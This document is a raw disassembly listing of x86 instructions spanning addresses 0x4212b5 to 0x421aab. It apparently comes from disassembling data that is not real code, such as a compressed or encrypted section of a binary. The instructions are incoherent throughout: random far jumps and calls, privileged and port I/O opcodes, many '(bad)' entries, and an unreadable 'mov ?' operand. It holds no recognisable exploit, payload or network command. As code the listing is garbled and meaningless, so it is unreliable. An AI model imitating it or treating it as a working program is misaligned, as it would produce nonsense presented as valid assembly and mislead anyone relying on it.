  4212b5:	rcl    DWORD PTR [ecx+0x44940ffa],0x1f
  4212bc:	out    dx,al
  4212bd:	retf   0xaf1d
  4212c0:	pop    es
  4212c1:	pop    eax
  4212c2:	scas   eax,DWORD PTR es:[edi]
  4212c3:	inc    edi
  4212c4:	inc    esp
  4212c5:	inc    ebp
  4212c6:	mov    dl,0x10
  4212c8:	arpl   WORD PTR [bx+si+0x14],si
  4212cc:	ins    BYTE PTR es:[edi],dx
  4212cd:	xchg   esp,eax
  4212ce:	adc    DWORD PTR [edx+0x6f793968],0x7abcfd42
  4212d8:	invd   
  4212da:	lock mov ebx,0x2d57261f
  4212e0:	jae    0x4212a8
  4212e2:	push   0xe4e68451
  4212e7:	add    bh,BYTE PTR [eax-0x77fecb3f]
  4212ed:	pop    ds
  4212ee:	jo     0x4212b4
  4212f0:	add    BYTE PTR [ebx+ecx*2-0x22fb13cc],bh
  4212f7:	jns    0x4212e9
  4212f9:	es loop 0x421330
  4212fc:	inc    eax
  4212fd:	jecxz  0x4212d4
  4212ff:	push   eax
  421300:	adc    DWORD PTR [esi+edx*4+0x73],esp
  421304:	imul   esi,DWORD PTR [edi-0x71],0xf59c3fe
  42130b:	lods   eax,DWORD PTR ds:[esi]
  42130c:	sub    BYTE PTR [ebp+0x81425dd],dh
  421312:	pop    esi
  421313:	int3   
  421314:	test   DWORD PTR [eax],esp
  421316:	iret   
  421317:	cmp    BYTE PTR [ecx+ebx*2-0x6d],bl
  42131b:	sbb    DWORD PTR ds:0xcc942e5d,edx
  421321:	jae    0x4212e1
  421323:	adc    DWORD PTR [ebx-0x76ef7075],0x587e5cf3
  42132d:	in     al,dx
  42132e:	add    BYTE PTR [ebx],dh
  421330:	scas   eax,DWORD PTR es:[edi]
  421331:	daa    
  421332:	or     BYTE PTR [esi],0xfa
  421335:	jae    0x42133f
  421337:	pop    ebx
  421338:	mov    eax,ds:0xe1d18110
  42133d:	mov    al,0x2c
  42133f:	and    ebp,esi
  421341:	int    0x66
  421343:	push   esp
  421344:	ja     0x421325
  421346:	push   edx
  421347:	lods   al,BYTE PTR ds:[esi]
  421348:	pop    ebx
  421349:	retf   
  42134a:	mov    dl,0x20
  42134c:	mov    ebx,0x1150c0be
  421351:	pushf  
  421352:	aas    
  421353:	aad    0x7a
  421355:	and    eax,0x81d3e43e
  42135a:	inc    esp
  42135b:	sub    al,0xa9
  42135d:	sbb    BYTE PTR [esi],cl
  42135f:	or     esp,DWORD PTR [edx+0x612b1fe9]
  421365:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421366:	push   es
  421367:	mov    esi,0xbecf9ed7
  42136c:	mov    ecx,0x9594126d
  421371:	dec    ecx
  421372:	mov    eax,0x94acf452
  421377:	int    0xf7
  421379:	pop    ecx
  42137a:	inc    ebx
  42137b:	mov    dl,0x6a
  42137d:	mov    dl,0x1f
  42137f:	cmp    ebx,DWORD PTR [ebp-0x69290807]
  421385:	cli    
  421386:	mov    dh,0x36
  421388:	sbb    eax,0x1cf1bbba
  42138d:	xor    bh,BYTE PTR [ecx+0x6e]
  421390:	das    
  421391:	(bad)  
  421392:	ficomp WORD PTR [edx+ebx*4]
  421395:	(bad)  
  421396:	loop   0x42137b
  421398:	cmp    ebx,DWORD PTR [ebx+edi*2-0x2b]
  42139c:	and    ecx,0x7e
  42139f:	mov    al,0x3b
  4213a1:	(bad)  
  4213a2:	lock mov ch,0x81
  4213a5:	inc    ebx
  4213a6:	jmp    0x92376e51
  4213ab:	cld    
  4213ac:	daa    
  4213ad:	xor    edx,DWORD PTR [edi]
  4213af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213b0:	sub    DWORD PTR [eax+0x3ca48c38],ecx
  4213b6:	add    bl,ah
  4213b8:	lds    esi,FWORD PTR [eax-0x3d]
  4213bb:	push   esi
  4213bc:	jmp    0xdce53c61
  4213c1:	ins    BYTE PTR es:[edi],dx
  4213c2:	cmp    ah,0xee
  4213c5:	sbb    BYTE PTR [ebx],cl
  4213c7:	addr16 pop ss
  4213c9:	test   al,0xd2
  4213cb:	out    dx,eax
  4213cc:	mov    ecx,fs
  4213ce:	mov    bh,0x70
  4213d0:	sti    
  4213d1:	ret    0x515b
  4213d4:	inc    edx
  4213d6:	inc    ebx
  4213d7:	jecxz  0x421453
  4213d9:	js     0x42139a
  4213db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4213dc:	pop    ebp
  4213de:	ds (bad) 
  4213e0:	aas    
  4213e1:	and    eax,0xb7c9f4ee
  4213e6:	mov    esi,0x83e29b2f
  4213eb:	fnstsw WORD PTR [edi+0x6e4f11b8]
  4213f1:	popf   
  4213f2:	mov    ah,0x56
  4213f4:	sbb    al,ah
  4213f6:	mov    esp,0xf578933a
  4213fb:	push   ebp
  4213fc:	xor    eax,0xd9947bb2
  421401:	mov    dh,0x4e
  421403:	xchg   ebx,eax
  421404:	jmp    0x421401
  421406:	push   0x3011506
  42140b:	jg     0x42148a
  42140d:	mov    bl,0xd4
  42140f:	pop    es
  421410:	inc    eax
  421411:	shl    cl,1
  421413:	inc    ebp
  421414:	lea    ebp,[ecx]
  421416:	in     eax,0x8
  421418:	mov    edi,0x3812e50d
  42141d:	pop    ss
  42141e:	adc    eax,0xbcc6dc5c
  421423:	das    
  421424:	adc    ecx,edx
  421426:	push   ebx
  421427:	mov    esi,0xb6d58084
  42142c:	pop    esi
  42142d:	lahf   
  42142e:	scas   eax,DWORD PTR es:[edi]
  42142f:	xor    BYTE PTR [eax-0x65a9a921],0xd9
  421436:	mov    BYTE PTR [ebx+0x49],ah
  421439:	ja     0x421456
  42143b:	enter  0x80e1,0xfa
  42143f:	cs fwait
  421441:	lock jbe 0x421425
  421444:	fadd   QWORD PTR [edi+0x7d]
  421447:	sub    ecx,DWORD PTR [ecx]
  421449:	add    ecx,0xdc2a72cd
  42144f:	ret    
  421450:	daa    
  421451:	scas   eax,DWORD PTR es:[edi]
  421452:	dec    BYTE PTR [edx-0x3c]
  421455:	ja     0x421447
  421457:	mov    bh,0x93
  421459:	fst    DWORD PTR [ebx+0x2d]
  42145c:	daa    
  42145d:	dec    edi
  42145e:	xchg   esi,eax
  42145f:	pusha  
  421460:	and    al,0xe8
  421462:	les    ebp,FWORD PTR [edx+0x40]
  421465:	cmp    DWORD PTR [edi+0x596f26d4],ebx
  42146b:	mov    ?,WORD PTR [eax]
  42146d:	mov    al,0xab
  42146f:	xchg   ebx,eax
  421470:	(bad)  
  421471:	sub    al,0x94
  421473:	or     ebx,DWORD PTR [ecx-0x52]
  421476:	sub    DWORD PTR [ebx-0x70664cb2],ecx
  42147c:	xor    al,0x7
  42147e:	(bad)  
  42147f:	iret   
  421480:	pop    eax
  421481:	or     al,0x27
  421483:	js     0x42147c
  421485:	and    ebx,DWORD PTR [edx+0x3f]
  421488:	and    eax,0x3fdc0877
  42148d:	dec    ecx
  42148e:	jmp    0x4214d3
  421490:	gs push ss
  421492:	in     al,0xe6
  421494:	aam    0xd5
  421496:	inc    eax
  421497:	retf   0x1140
  42149a:	ja     0x42142e
  42149c:	pop    esp
  42149d:	jle    0x4214f2
  42149f:	push   esp
  4214a0:	ds nop
  4214a2:	pop    edi
  4214a3:	sbb    bh,0x92
  4214a6:	dec    esp
  4214a7:	push   0xe7a52961
  4214ac:	cdq    
  4214ad:	inc    edx
  4214ae:	enter  0x7155,0xf0
  4214b2:	fist   WORD PTR [ecx-0x41]
  4214b5:	hlt    
  4214b6:	jp     0x4214ff
  4214b8:	std    
  4214b9:	(bad)
  4214bc:	pop    edi
  4214bd:	pop    ecx
  4214be:	cmp    bh,dh
  4214c0:	scas   eax,DWORD PTR es:[edi]
  4214c1:	retf   0xea8a
  4214c4:	mov    dh,BYTE PTR fs:[ecx]
  4214c7:	test   BYTE PTR [esi],0xa6
  4214ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4214cb:	mov    cl,0x48
  4214cd:	(bad)  
  4214ce:	sbb    edx,DWORD PTR [esi]
  4214d0:	adc    al,0x6d
  4214d2:	sbb    dl,BYTE PTR [edi-0x3e5cc35e]
  4214d8:	adc    dx,WORD PTR [ecx-0x47223fee]
  4214df:	ja     0x4214e4
  4214e1:	daa    
  4214e2:	fstp   QWORD PTR [ecx-0x10]
  4214e5:	adc    eax,0x286c1688
  4214ea:	shr    DWORD PTR [eax+0x28bf7667],1
  4214f0:	jg     0x42147a
  4214f2:	inc    ebx
  4214f3:	bound  eax,QWORD PTR [ecx]
  4214f5:	adc    al,0xec
  4214f7:	xor    eax,0x197b7678
  4214fc:	sahf   
  4214fd:	in     eax,0xa2
  4214ff:	lahf   
  421500:	dec    ecx
  421501:	enter  0xb918,0xde
  421505:	pusha  
  421506:	pop    ebp
  421507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421508:	xor    edi,DWORD PTR [ebx]
  42150a:	addr16 es loope 0x4214eb
  42150e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42150f:	test   BYTE PTR [bp+di-0x29cd],dl
  421514:	pushf  
  421515:	mov    dh,al
  421517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421518:	sub    al,0xe2
  42151a:	mov    al,ds:0x18ab50e5
  42151f:	xchg   edx,eax
  421520:	push   eax
  421521:	add    esp,edx
  421523:	test   eax,0x3f280986
  421528:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421529:	or     DWORD PTR [eax+0x634382],ebx
  42152f:	mov    ecx,0x7d9e54f6
  421534:	dec    edx
  421535:	dec    edi
  421536:	sub    eax,0x73381a36
  42153b:	and    ebp,DWORD PTR [edx-0x4ada5466]
  421541:	jg     0x42159f
  421543:	pop    esp
  421544:	sub    eax,0x41ce7114
  421549:	(bad)  
  42154a:	in     eax,0xca
  42154c:	cmp    edx,DWORD PTR [ecx-0x6]
  42154f:	xchg   ecx,eax
  421550:	adc    eax,0x844b9da1
  421555:	push   ss
  421556:	mov    ds:0xc5e5b3b,eax
  42155b:	push   eax
  42155c:	fstp   DWORD PTR [eax+0x7f]
  42155f:	out    dx,eax
  421560:	sbb    edi,edi
  421562:	xchg   esi,eax
  421563:	data16 (bad) 
  421565:	cmp    eax,0xc643c2bc
  42156a:	add    al,0x43
  42156c:	sbb    edx,ebp
  42156e:	xor    BYTE PTR [eax-0x644aeebb],al
  421574:	fiadd  WORD PTR [edi+0x8]
  421577:	or     esp,DWORD PTR [ebp+0xf]
  42157a:	push   edx
  42157b:	dec    esi
  42157c:	iret   
  42157d:	xlat   BYTE PTR ds:[ebx]
  42157e:	xchg   edx,eax
  42157f:	xor    DWORD PTR [eax],0x2b0201a4
  421585:	daa    
  421586:	rcl    DWORD PTR [ebx+eax*8],0xd9
  42158a:	push   edx
  42158b:	in     al,0x7d
  42158d:	xor    eax,0xecac2026
  421592:	out    0xc9,al
  421594:	enter  0xa6b6,0x7d
  421598:	xor    ebx,esi
  42159a:	les    ebx,FWORD PTR [edx+0x1c6614b]
  4215a0:	push   eax
  4215a1:	es cdq 
  4215a3:	push   eax
  4215a4:	and    al,0x7
  4215a6:	push   esp
  4215a7:	in     eax,0x22
  4215a9:	ror    BYTE PTR [edx-0xa],1
  4215ac:	hlt    
  4215ad:	mov    bh,0x1b
  4215af:	cmp    ah,dh
  4215b1:	icebp  
  4215b2:	inc    esp
  4215b3:	push   edi
  4215b4:	loopne 0x421598
  4215b6:	cmp    DWORD PTR [eax],ebx
  4215b8:	xor    ah,BYTE PTR [esi+0x57879c58]
  4215be:	mov    eax,ds:0x2332df45
  4215c3:	retf   0x1ffc
  4215c6:	mov    ch,0x51
  4215c8:	xor    BYTE PTR [ebx],bl
  4215ca:	push   cs
  4215cb:	pusha  
  4215cc:	rcl    DWORD PTR [edx-0x22c428b1],cl
  4215d2:	out    0xb0,eax
  4215d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4215d5:	xor    ebp,ebx
  4215d7:	jmp    0xe8b6:0x4ac3d7a4
  4215de:	pop    edi
  4215df:	mov    WORD PTR [edi-0x2174682a],fs
  4215e5:	in     al,0x87
  4215e7:	sysret 
  4215e9:	(bad)  [ecx-0x81fbb6e]
  4215ef:	pop    ecx
  4215f0:	or     ah,BYTE PTR [eax-0x240a3d32]
  4215f6:	and    al,0xd8
  4215f8:	adc    DWORD PTR [esp+esi*8],ecx
  4215fb:	mov    edx,0x424b021f
  421600:	push   edx
  421601:	pop    eax
  421602:	stos   DWORD PTR es:[edi],eax
  421603:	lahf   
  421604:	inc    esi
  421605:	push   edx
  421606:	pop    esp
  421607:	jp     0x4215d2
  421609:	dec    edx
  42160a:	push   ss
  42160b:	shl    DWORD PTR [ecx+edi*2],cl
  42160e:	gs mov ebp,0x2fa10771
  421614:	mov    dl,ch
  421616:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421617:	cmp    BYTE PTR [edx-0xf0d6fa9],dl
  42161d:	sbb    BYTE PTR [edx+0x2e],cl
  421620:	sub    esi,DWORD PTR es:0x45b8096e
  421627:	pop    eax
  421628:	dec    esi
  421629:	cld    
  42162a:	push   0x5aa31f93
  42162f:	mov    esi,DWORD PTR [ecx+0x68185a0f]
  421635:	dec    edx
  421636:	in     al,dx
  421637:	rol    DWORD PTR [esp+esi*1-0x3b3cb577],1
  42163e:	jb     0x4215c4
  421640:	mov    eax,0x94441afe
  421645:	jle    0x42160c
  421647:	or     dh,dl
  421649:	sub    DWORD PTR [ecx],edx
  42164b:	adc    ebp,DWORD PTR [ecx]
  42164d:	xor    dl,bl
  42164f:	jmp    0x8153645a
  421654:	loopne 0x42162f
  421656:	jns    0x421669
  421658:	mov    eax,0xa5dda90f
  42165d:	jl     0x421616
  42165f:	xchg   edi,eax
  421660:	sbb    eax,0xfdc7b0f6
  421665:	xlat   BYTE PTR ds:[ebx]
  421666:	(bad)
  421669:	mov    al,ds:0x23d37779
  42166e:	mov    ah,0x8f
  421670:	mov    eax,0xe4e3463f
  421675:	pop    es
  421676:	or     DWORD PTR [ecx+esi*1-0x79],eax
  42167a:	and    al,0xef
  42167c:	push   esi
  42167d:	int    0xfc
  42167f:	jnp    0x4216d6
  421681:	fisttp QWORD PTR [ebp+0x27]
  421684:	dec    dx
  421686:	clc    
  421687:	and    BYTE PTR [esi],ah
  421689:	cmc    
  42168a:	out    0x41,eax
  42168c:	lahf   
  42168d:	(bad)  
  42168e:	push   eax
  42168f:	sub    edx,DWORD PTR [edx+0x74f0f948]
  421695:	sbb    BYTE PTR [ebx],bl
  421697:	inc    eax
  421698:	pop    edi
  421699:	loop   0x421635
  42169b:	jns    0x421672
  42169d:	cld    
  42169e:	pop    ecx
  42169f:	imul   eax,DWORD PTR [edx+0x2e],0x64433a22
  4216a6:	gs add al,0xdd
  4216a9:	out    0x25,eax
  4216ab:	aaa    
  4216ac:	xor    edx,DWORD PTR [edi-0x68]
  4216af:	rcl    BYTE PTR [edx+ecx*8],1
  4216b2:	cmp    eax,0x1fce7f38
  4216b7:	adc    cl,BYTE PTR [ebx+0x5b]
  4216ba:	fs (bad) 
  4216bc:	xchg   edx,eax
  4216bd:	xchg   edx,eax
  4216be:	lahf   
  4216bf:	adc    BYTE PTR [eax],bh
  4216c1:	lds    ebp,FWORD PTR [ebp+0x40]
  4216c4:	mov    edi,0x5a7ed03
  4216c9:	es int 0xa3
  4216cc:	push   ecx
  4216cd:	add    BYTE PTR [esi-0x5c508473],cl
  4216d3:	ret    
  4216d4:	cld    
  4216d5:	mov    ebp,ecx
  4216d7:	mov    DWORD PTR [edi-0x1f451add],eax
  4216dd:	adc    al,0xde
  4216df:	push   ss
  4216e0:	retf   
  4216e1:	push   ds
  4216e2:	inc    esi
  4216e3:	jecxz  0x4216a2
  4216e5:	inc    edi
  4216e6:	cmp    edx,DWORD PTR [ebx+0x5b]
  4216e9:	mov    ebp,0x39a4abfb
  4216ee:	iret   
  4216ef:	fiadd  DWORD PTR [edx+0x5e]
  4216f2:	sub    bl,bl
  4216f4:	adc    BYTE PTR [edx],bl
  4216f6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216f7:	dec    edi
  4216f8:	xchg   esi,eax
  4216f9:	bound  esi,QWORD PTR ds:0xe7105ac3
  4216ff:	rol    BYTE PTR [edi],1
  421701:	ins    BYTE PTR es:[edi],dx
  421702:	nop
  421703:	pop    eax
  421704:	jbe    0x42177f
  421706:	adc    ah,BYTE PTR [esi-0x15fa8424]
  42170c:	mov    ebp,0xdeb65cb4
  421711:	sub    ah,BYTE PTR [edi]
  421713:	lock loop 0x421709
  421716:	and    BYTE PTR [eax+edx*2+0x6d1047a6],bl
  42171d:	ret    0xf2a2
  421720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421721:	std    
  421722:	lods   al,BYTE PTR ds:[esi]
  421723:	mov    gs,ecx
  421725:	pop    eax
  421726:	xchg   ebx,eax
  421727:	gs xchg edx,eax
  421729:	mov    bh,0x67
  42172b:	sbb    DWORD PTR [edx+edx*2-0x43],edx
  42172f:	pop    es
  421730:	addr16 call 0x2880:0xea096757
  421738:	cmp    DWORD PTR [ebx+0x72],ebx
  42173b:	jecxz  0x42171a
  42173d:	imul   edx,DWORD PTR [ecx-0xf],0x2049f8a2
  421744:	test   edx,0xede36b0f
  42174a:	test   edx,ecx
  42174c:	xchg   BYTE PTR [esp+esi*8+0x20],ah
  421750:	jp     0x421760
  421752:	ficom  DWORD PTR [esi+edx*2]
  421755:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421756:	mov    dl,0xe3
  421758:	push   eax
  421759:	and    al,0x84
  42175b:	rcl    BYTE PTR [edi+0x6],0xef
  42175f:	cwde   
  421760:	test   cl,bl
  421762:	dec    ecx
  421763:	sub    al,0xc5
  421765:	es sub ah,al
  421768:	fs mov edi,0xf6546f62
  42176e:	dec    esi
  42176f:	ret    
  421770:	mov    esp,0x46a8983e
  421775:	mov    dl,0x24
  421777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421778:	xlat   BYTE PTR ds:[ebx]
  421779:	rcr    DWORD PTR [eax+0x1b],1
  42177c:	adc    DWORD PTR [eax+eax*4+0x56],esi
  421780:	shr    BYTE PTR ds:0x9b2fc9d7,0x3e
  421787:	lds    esp,FWORD PTR [ebx-0x3e]
  42178a:	jle    0x421710
  42178c:	fld    DWORD PTR [eax+ecx*4+0x6d2cfa2]
  421793:	sub    eax,0x3e34987d
  421798:	lahf   
  421799:	cmp    DWORD PTR [edi],edi
  42179b:	push   0xf9324bd0
  4217a0:	mov    ch,0xc0
  4217a2:	or     al,BYTE PTR [edi+0x7931eefd]
  4217a8:	and    DWORD PTR [ecx],0xeba8245d
  4217ae:	jle    0x4217ff
  4217b0:	push   es
  4217b1:	jo     0x4217c1
  4217b3:	mov    dh,0x5a
  4217b5:	icebp  
  4217b6:	gs cmc 
  4217b8:	mov    esi,DWORD PTR [ebx+ebx*2-0x24ab38b5]
  4217bf:	popf   
  4217c0:	call   0x40a2d9dd
  4217c5:	ins    BYTE PTR es:[edi],dx
  4217c6:	mov    bh,0x1c
  4217c8:	xlat   BYTE PTR ds:[ebx]
  4217c9:	and    DWORD PTR [edi],ebx
  4217cb:	jb     0x421839
  4217cd:	lds    eax,FWORD PTR [ebx+0x47a46b8d]
  4217d3:	inc    esi
  4217d4:	push   edi
  4217d5:	repz push ss
  4217d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217d8:	and    al,0xb8
  4217da:	dec    edx
  4217db:	test   DWORD PTR [edi+edi*4],ebp
  4217de:	push   esi
  4217df:	push   ecx
  4217e0:	push   ecx
  4217e1:	repnz sahf 
  4217e3:	iret   
  4217e4:	retf   0x221b
  4217e7:	sbb    BYTE PTR [eax],bh
  4217e9:	neg    BYTE PTR [edx+0x35]
  4217ec:	into   
  4217ed:	scas   eax,DWORD PTR es:[edi]
  4217ee:	sbb    BYTE PTR [edi],0xc8
  4217f1:	and    BYTE PTR [edx-0x3a345101],0xed
  4217f8:	mov    bh,0x6c
  4217fa:	ds mov ebp,0x142aedb2
  421800:	xchg   esp,eax
  421801:	imul   DWORD PTR [esi-0x37]
  421804:	scas   al,BYTE PTR es:[edi]
  421805:	and    BYTE PTR [ecx-0x6f3d6015],dh
  42180b:	sar    DWORD PTR [esi-0x4e],cl
  42180e:	jecxz  0x42187a
  421810:	jle    0x42183c
  421812:	pop    edx
  421813:	cmp    al,0xb2
  421815:	pop    ebp
  421816:	test   eax,0xd680e57a
  42181b:	mov    esp,0xfe5ee6b5
  421820:	mov    ds:0xb798957c,eax
  421825:	pop    edi
  421826:	mov    ds:0xe9bbe7ed,eax
  42182b:	add    BYTE PTR ds:0x76ca17f4,0x5b
  421832:	ficom  DWORD PTR [si+0x34]
  421836:	jmp    0x4a4ec680
  42183b:	shl    DWORD PTR [edx-0x3c0f1c8],1
  421841:	pop    es
  421842:	mov    bl,0xe8
  421844:	data16 lods al,BYTE PTR ds:[esi]
  421846:	xchg   edx,eax
  421847:	in     al,0xb0
  421849:	cli    
  42184a:	push   ds
  42184b:	pop    ebx
  42184c:	out    dx,eax
  42184d:	add    eax,0x16d918c2
  421852:	xchg   ecx,eax
  421853:	lahf   
  421854:	xchg   ebp,eax
  421855:	bnd jmp DWORD PTR [ebp+0x18badffe]
  42185c:	mov    edi,0xd79ef8bc
  421861:	jo     0x42186f
  421863:	push   ss
  421864:	int    0x84
  421866:	dec    ebp
  421867:	sub    al,0xe2
  421869:	pop    ecx
  42186a:	(bad)  
  42186b:	(bad)  
  42186c:	and    eax,0xedd8d999
  421871:	pop    esi
  421872:	out    0x51,eax
  421874:	and    bh,BYTE PTR [ecx+0x51]
  421877:	sub    ah,BYTE PTR [ebx+0x43]
  42187a:	jmp    0x555d0700
  42187f:	gs mov esp,0x44167370
  421885:	and    edx,DWORD PTR [ebp-0x15a47e8c]
  42188b:	sbb    DWORD PTR [edi],edx
  42188d:	popf   
  42188e:	fwait
  42188f:	lods   al,BYTE PTR ds:[esi]
  421890:	mov    al,ds:0xcece21d8
  421895:	cmc    
  421896:	sub    BYTE PTR [ebx+0x0],0xad
  42189a:	arpl   dx,bp
  42189c:	jno    0x421888
  42189e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42189f:	jle    0x4218d7
  4218a1:	mov    ecx,0x4ceb5dfc
  4218a6:	adc    BYTE PTR [edx-0x57],cl
  4218a9:	and    dh,dh
  4218ab:	loop   0x42191a
  4218ad:	sub    bh,BYTE PTR [edx-0x1d5aaceb]
  4218b3:	mov    ch,0x6b
  4218b5:	test   al,0x27
  4218b7:	ror    DWORD PTR [ecx+0x59],1
  4218ba:	in     eax,0xfd
  4218bc:	xor    ebx,DWORD PTR [edx]
  4218be:	xchg   esi,eax
  4218bf:	enter  0xee55,0x9f
  4218c3:	jmp    0x4218f2
  4218c5:	mov    eax,ds:0x75f6b9dd
  4218ca:	sub    BYTE PTR [esi+0x343a3be3],al
  4218d0:	cwde   
  4218d1:	aam    0xe3
  4218d3:	jge    0x4218f9
  4218d5:	fs push ss
  4218d7:	jmp    0xbc08:0xbd4bcde0
  4218de:	sub    DWORD PTR [ebx+0x4a],ebp
  4218e1:	pop    ds
  4218e2:	scas   al,BYTE PTR es:[edi]
  4218e3:	mov    eax,ds:0xfafbe921
  4218e8:	sbb    BYTE PTR [eax+edx*4+0x3c599d3f],bl
  4218ef:	sbb    bl,dh
  4218f1:	clc    
  4218f2:	dec    esp
  4218f3:	test   eax,esi
  4218f5:	jo     0x4218cb
  4218f7:	shr    cl,1
  4218f9:	aad    0x31
  4218fb:	add    eax,DWORD PTR ds:0xb697f17e
  421902:	mov    ecx,ebp
  421904:	jmp    0x42197f
  421906:	sub    esp,DWORD PTR [edx]
  421908:	fld    TBYTE PTR [esi]
  42190a:	call   0x62ec3cdc
  42190f:	pop    ebx
  421910:	retf   0x4ce2
  421913:	aad    0xee
  421915:	lds    edx,FWORD PTR [esi-0x7aef0bca]
  42191b:	in     al,0x5c
  42191d:	dec    eax
  42191f:	pop    eax
  421920:	in     eax,dx
  421921:	xor    al,0x6a
  421923:	jne    0x42199f
  421925:	std    
  421926:	arpl   WORD PTR ds:0x6ff3fca4,ax
  42192c:	icebp  
  42192d:	sbb    BYTE PTR [ebx],bl
  42192f:	pop    eax
  421931:	push   es
  421932:	xchg   edi,eax
  421933:	(bad)  
  421934:	cs pop esp
  421936:	in     al,0x22
  421938:	addr16 inc ebp
  42193a:	je     0x42193d
  42193c:	jno    0x4219a1
  42193e:	sub    ebx,edx
  421940:	dec    ecx
  421941:	loopne 0x421936
  421943:	push   ss
  421944:	xchg   BYTE PTR [ebx+eiz*8],dl
  421947:	repnz mov dh,0x75
  42194a:	fist   DWORD PTR [ecx-0x2cdc5343]
  421950:	mov    ds:0x16b45459,eax
  421955:	sub    DWORD PTR ds:0xa4dfe251,ebx
  42195b:	jecxz  0x421936
  42195d:	sti    
  42195e:	mov    ebp,0x6fe976f9
  421963:	mov    ebx,0xe2a5ab45
  421968:	cmp    BYTE PTR [eax+0xe0c2288],cl
  42196e:	cmp    eax,esi
  421970:	adc    edi,edx
  421972:	inc    ebp
  421973:	aam    0xda
  421975:	and    al,BYTE PTR [edx+eax*2]
  421978:	xchg   DWORD PTR [ecx],ebx
  42197a:	sub    al,0x6b
  42197c:	xchg   ecx,eax
  42197d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42197e:	sub    al,0xca
  421980:	sub    BYTE PTR [ebx-0x86f89dc],bl
  421986:	jge    0x421938
  421988:	mov    esi,0x9ec5c41f
  42198d:	test   BYTE PTR [edx-0x68],bh
  421990:	std    
  421991:	mov    BYTE PTR [ebp-0x37],bh
  421994:	xchg   DWORD PTR [esi],esp
  421996:	call   0xcc0f78da
  42199b:	shr    BYTE PTR [ebx+0x7d7e19e3],1
  4219a1:	mov    dh,BYTE PTR [ecx+0x6aef3e1a]
  4219a7:	sub    ch,BYTE PTR [ebp-0x250bfa17]
  4219ad:	add    dl,BYTE PTR [ebp+0x12]
  4219b0:	fxch   st(4)
  4219b2:	push   cs
  4219b3:	jmp    0x8bca5f64
  4219b8:	add    al,0xc3
  4219ba:	adc    eax,0xe1f02088
  4219bf:	xchg   ebp,eax
  4219c0:	out    0xb9,eax
  4219c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4219c3:	fstp   TBYTE PTR [esi+0x11]
  4219c6:	push   ecx
  4219c7:	scas   al,BYTE PTR es:[edi]
  4219c8:	js     0x4219dc
  4219ca:	mov    ebx,0xc7f8f89a
  4219d0:	add    ecx,esi
  4219d2:	into   
  4219d3:	sbb    eax,eax
  4219d5:	or     cl,cl
  4219d7:	jmp    0xb947027b
  4219dc:	mov    ch,0x1
  4219de:	adc    dh,dl
  4219e0:	dec    esp
  4219e1:	bswap  edi
  4219e3:	push   0x1ec3bfa9
  4219e8:	push   ss
  4219e9:	lds    ebx,FWORD PTR [ebx-0x37]
  4219ec:	and    DWORD PTR [eax],ecx
  4219ee:	mov    bh,BYTE PTR [ecx-0x5a]
  4219f1:	jmp    0x421a29
  4219f3:	xchg   edx,eax
  4219f4:	out    0xad,eax
  4219f6:	mov    cl,0x46
  4219f8:	add    BYTE PTR [edi+ebp*1-0xa],bh
  4219fc:	dec    ebx
  4219fd:	ret    0xf61a
  421a00:	lods   eax,DWORD PTR ds:[esi]
  421a01:	jmp    0x11b37cf4
  421a06:	mov    ah,0x2a
  421a08:	push   eax
  421a09:	adc    edx,esi
  421a0b:	shl    ebx,1
  421a0d:	lock in eax,0xa5
  421a10:	or     al,0xda
  421a12:	cwde   
  421a13:	cmp    DWORD PTR [ebp+0x65],0xac4cfceb
  421a1a:	int    0xc4
  421a1c:	jle    0x421a68
  421a1e:	push   ebx
  421a1f:	in     al,0x69
  421a21:	ins    DWORD PTR es:[edi],dx
  421a22:	adc    al,0x72
  421a24:	bound  ebx,QWORD PTR [edi-0x3d]
  421a27:	sub    ah,BYTE PTR [ebx+0x4e]
  421a2a:	(bad)  
  421a2b:	clc    
  421a2c:	je     0x421a90
  421a2e:	xchg   edx,eax
  421a2f:	fldcw  WORD PTR [edi-0x14]
  421a32:	push   eax
  421a33:	adc    bh,BYTE PTR [edi]
  421a35:	(bad)  
  421a38:	data16 jle 0x421ab1
  421a3b:	das    
  421a3c:	mov    esp,0x5ce947a0
  421a41:	call   0xaeccdefd
  421a46:	jae    0x4219ea
  421a48:	dec    esp
  421a49:	fmul   DWORD PTR [edi+0xb]
  421a4c:	test   DWORD PTR [edx+0x2a8cdc7c],0x2307fa19
  421a56:	iret   
  421a57:	sub    bl,al
  421a59:	jne    0x421a17
  421a5b:	jb     0x421a40
  421a5d:	mov    eax,0x41e5b17d
  421a62:	mov    bh,0x51
  421a64:	aaa    
  421a65:	pop    ecx
  421a66:	mov    esp,0xfe091f2f
  421a6b:	sar    DWORD PTR es:[ecx-0x27d96c34],0xcd
  421a73:	cmp    eax,0xe760f101
  421a78:	test   BYTE PTR [ecx-0x44],al
  421a7b:	jns    0x421a67
  421a7d:	ror    DWORD PTR ds:0x6c2aa2b1,1
  421a83:	imul   esp,DWORD PTR [eax+0x675df4e2],0xbe5d2740
  421a8d:	shl    edx,cl
  421a8f:	das    
  421a90:	adc    ch,dl
  421a92:	pop    ds
  421a93:	inc    edi
  421a94:	cmc    
  421a95:	lods   al,BYTE PTR ds:[esi]
  421a96:	mov    ds,esi
  421a98:	maskmovq mm0,mm4
  421a9b:	daa    
  421a9c:	shl    BYTE PTR [ebp-0x2668b9fb],1
  421aa2:	sbb    BYTE PTR [ebx],dl
  421aa4:	and    eax,0x2f857e8a
  421aa9:	jbe    0x421ae8
  421aab:	pop    ecx
